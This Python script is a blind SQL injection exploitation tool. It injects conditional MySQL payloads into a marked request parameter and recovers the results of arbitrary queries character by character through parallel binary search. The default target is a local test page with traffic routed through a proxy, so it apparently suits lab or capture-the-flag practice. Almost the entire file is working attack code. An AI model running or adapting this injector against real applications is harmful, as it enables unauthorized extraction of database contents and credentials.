#!/usr/bin/python3

'''
- By Mukarram Khalid
- https://github.com/mukarramkhalid
- https://mukarramkhalid.com
- https://www.linkedin.com/in/mukarramkhalid
'''

import sys, json, secrets, readline
from multiprocessing import Pool, Manager
from functools import partial
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except:
    exit('[-] Failed to load requests module')

class HTTP():
    ''' HTTP class '''
    verbosity = False
    url = None
    parameters = None
    timeout = 5
    method = 'POST'
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080',
    }

    def __init__(self, url, parameters):
        self.url = url
        self.parameters = parameters
        self.session = requests.session()
        self.session.headers = self.headers

    def get(self, payload):
        return self.session.get(self.url, params = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False)

    def post(self, payload):
        return self.session.post(self.url, data = payload, headers = self.headers, timeout = self.timeout, verify = False, allow_redirects = False, proxies = self.proxies)


class Injector():
    ''' Injector Class '''
    payload = "1'and if(substring(%s,%i,1)between(0x%x)and(0x%x),1,(select table_name from information_schema.tables))and''='"
    payload_length = "1'and if(length(%s)between(%i)and(%i),1,(select table_name from information_schema.tables))and''='"
    verbosity = False
    injectible = None
    http = None

    def __init__(self, url, parameters):
        self.http = HTTP(url, parameters)
        self.setInjectible()
        self.reset()

    def reset(self):
        self.start = 0
        self.end = 255

    def setInjectible(self):
        self.injectible = {v : k for k, v in self.http.parameters.items()}['__PAYLOAD__']

    def makePayload(self, position, start, pointer, length = False):
        payload = self.http.parameters
        if not length:
            payload[self.injectible] = self.payload % (self.query, position, start, pointer)
        else:
            payload[self.injectible] = self.payload_length % (self.query, start, pointer)
        return payload

    def characterAt(self, output, position):
        start = 0
        end = 255
        pointer = 0
        while not (start == end == pointer):
            pointer = start + int((end - start) / 2)
            if (start == end == pointer):
                output[position] = chr(pointer)
                self.print(output)
                return
            r = self.http.post(self.makePayload(position, start, pointer))
            # Change this block to handle any true / false case
            if len(r.text) < 45000:
                # False
                start = pointer + 1
            else:
                # True
                end = pointer
        output[position] = chr(pointer)
        self.print(output)
        return

    def print(self, output):
        sys.stdout.flush()
        print("\r", end = '')
        print(''.join(dict(sorted(output.items())).values()), end = '')
        sys.stdout.flush()

    def length(self):
        start = 0
        end = 2000
        pointer = 0
        while not (start == end == pointer):
            pointer = start + int((end - start) / 2)
            if (start == end == pointer):
                return pointer
            r = self.http.post(self.makePayload(0, start, pointer, True))
            if len(r.text) < 45000:
                # False
                start = pointer + 1
            else:
                # True
                end = pointer
        return pointer

    def inject(self, query):
        self.query = query
        print('[+] Finding query length')
        length = self.length()
        print('[+] Query length : %i' % length)
        with Manager() as manager:
            output = manager.dict()
            method = partial(self.characterAt, output)
            with Pool(8) as pool:
                pool.map(method, list(range(1, length + 1)))
            print("\n")
            return

def main():
    url = 'http://127.0.0.1/sqli.php'
    parameters = {
        'id' : '__PAYLOAD__',
        'other' : 'other'        
    }
    injector = Injector(url, parameters)
    queries = ['version()', 'user()', 'database()']
    while True:
        query = input('[+] Query [Example: %s]: ' % secrets.choice(queries))
        injector.inject(query)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('[-] CTRL-C Detected')
